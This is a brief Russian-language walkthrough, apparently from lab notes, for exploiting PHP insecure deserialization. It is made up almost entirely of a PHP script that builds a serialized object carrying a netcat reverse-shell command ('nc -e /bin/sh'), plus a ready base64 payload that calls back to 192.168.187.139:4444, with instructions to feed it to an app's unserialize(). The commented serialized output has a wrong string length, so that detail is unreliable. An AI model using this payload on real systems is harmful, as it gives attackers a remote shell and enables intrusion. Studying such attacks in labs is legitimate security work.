### Эксплуатация уязвимости Insecure Deserialization в PHP

1. Создаем скрипт php:

<?php
class MaliciousUserData {
    public $command = 'nc -e /bin/sh IP PORT';
}

// 1. СОЗДАЕМ объект
$obj = new MaliciousUserData();

// 2. СЕРИАЛИЗУЕМ объект в строку
$serialized = serialize($obj); 
// Результат: O:17:"MaliciousUserData":1:{s:7:"command";s:43:"nc -e /bin/sh IP PORT";}

// 3. Кодируем ЭТУ строку в Base64
$base64 = base64_encode($serialized);
?>

2. Выполняем скрипт на атакующей машине и получаем строку для эксплуатации:
TzoxNzoiTWFsaWNpb3VzVXNlckRhdGEiOjE6e3M6NzoiY29tbWFuZCI7czozNDoibmMgLWUgL2Jpbi9zaCAxOTIuMTY4LjE4Ny4xMzkgNDQ0NCI7fQ==

3. Вставляем эту строку в уязвимое приложение, которое принимает сериализованные данные от пользователя и передает их в unserialize()